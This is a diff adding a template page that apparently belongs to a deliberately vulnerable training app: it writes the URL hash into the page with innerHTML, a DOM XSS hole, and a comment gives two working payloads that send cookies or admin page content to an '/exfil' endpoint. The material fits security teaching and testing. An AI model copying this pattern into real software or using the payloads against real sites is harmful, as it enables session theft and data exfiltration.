@@ -1,0 +1,21 @@
+{% extends "base.html" %}
+{% block content %}
+<h1>Messages</h1>
+<p class="muted">Welcome messages are shown from the URL hash, e.g. <code>/messages#Hello</code>.</p>
+<div id="toast" class="post"></div>
+
+<script>
+  // =================================================================
+  // DOM XSS: location.hash is attacker-controlled. `decodeURIComponent`
+  // is NOT a sanitizer — it only decodes percent-encoding.
+  // innerHTML parses the string as HTML.
+  //
+  // Payload: /messages#<img src=x onerror="fetch('/exfil?data='+document.cookie)">
+  // Or, given HttpOnly:  /messages#<img src=x onerror="fetch('/admin').then(r=>r.text()).then(t=>fetch('/exfil?data='+encodeURIComponent(t)))">
+  // =================================================================
+  var raw = location.hash.slice(1);
+  var msg = "";
+  try { msg = decodeURIComponent(raw); } catch (e) { msg = raw; }
+  document.getElementById("toast").innerHTML = msg || "Welcome!";
+</script>
+{% endblock %}
